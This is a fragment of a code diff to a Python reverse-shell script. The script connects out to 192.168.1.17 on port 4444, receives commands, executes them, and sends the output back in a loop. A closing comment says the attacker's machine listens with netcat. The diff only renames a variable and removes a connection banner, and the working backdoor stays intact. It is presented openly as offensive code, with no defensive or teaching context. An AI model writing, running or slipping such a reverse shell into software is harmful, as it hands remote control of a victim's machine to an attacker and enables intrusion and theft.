@@ -8,14 +8,13 @@ def execute(cmd):
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("192.168.1.17", 4444))
 
-s.send(b"\n[+] Connection Successful!!!\n")
 while True:
     cmd = s.recv(1024)
     try:
-        result = execute(cmd.decode("utf-8"))
+        output = execute(cmd.decode("utf-8"))
     except:
-        result = execute(str(cmd))
-    s.send(result)
+        output = execute(str(cmd))
+    s.send(output)
 s.close()
 '''
 In 192.168.1.17 we listen for incoming connections using netcat
